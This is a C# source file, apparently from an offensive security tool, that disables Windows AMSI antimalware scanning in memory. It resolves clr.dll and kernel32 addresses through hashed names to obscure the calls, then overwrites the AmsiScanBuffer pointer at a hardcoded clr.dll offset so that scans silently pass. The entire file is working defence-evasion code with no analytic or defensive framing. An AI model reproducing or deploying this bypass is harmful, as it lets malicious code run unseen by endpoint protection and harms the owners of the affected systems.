using System;
using System.Runtime.InteropServices;
using PositiveIntent.DINV;
using System.IO;
using System.Reflection;

namespace PositiveIntent
{
    public class AMSI
    {
        public static void Patch()
        {
            try
            {
                // Read dummy assembly bytes
                byte[] assemblyBytes = File.ReadAllBytes("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Linq.dll");

                // Load dummy assembly to force the CLR to initialize AMSI
                Assembly assembly = Assembly.Load(assemblyBytes);

                // Create a persistent reference to a type in the assembly to prevent it from being unloaded
                Type enumerableType = assembly.GetType("System.Linq.Enumerable");
            }
            catch
            {
                Console.WriteLine("Failed to load C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Linq.dll");
                Environment.Exit(-1);
            }

            if (IntPtr.Size == 8) // 64 bit process
            {
                // Get base address of clr.dll & kernel32.dll
                IntPtr clrBaseAddress = Generic.GetLoadedModuleAddress("B0ACD28868EF3BAD632366A915B64319", 0x123456789); // clr.dll
                IntPtr kernel32BaseAddress = Generic.GetLoadedModuleAddress("6B57900FDD9BC3ED1AACC8BB36AF6749", 0x123456789); // kernel32.dll

                // Get pointer to GetCurrentThreadId in kernel32.dll
                object[] parameters = new object[] { kernel32BaseAddress, "GetCurrentThreadId" };
                IntPtr pGetProcAddress = Generic.GetExportAddress(kernel32BaseAddress, "BA0307826406754C1A4B8DDF988DD065", 0x123456789); // GetProcAddress
                IntPtr pGetCurrentThreadId = Generic.DynamicFunctionInvoke<IntPtr>(pGetProcAddress, typeof(GetProcAddress), ref parameters);

                // Create a byte array from the IntPtr 
                byte[] addressBytes = BitConverter.GetBytes(pGetCurrentThreadId.ToInt64());

                // Overwrite unprotected pointer to AmsiScanBuffer in clr.dll at offset 9607312 with pointer to GetCurrentThreadId in kernel32.dll
                Marshal.Copy(addressBytes, 0, clrBaseAddress + 9607312, addressBytes.Length);
            }
            else
            {
                Console.WriteLine("32 bit processes not supported yet."); // need to get offsets for 32 bit
                Environment.Exit(-1);
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);
    }
}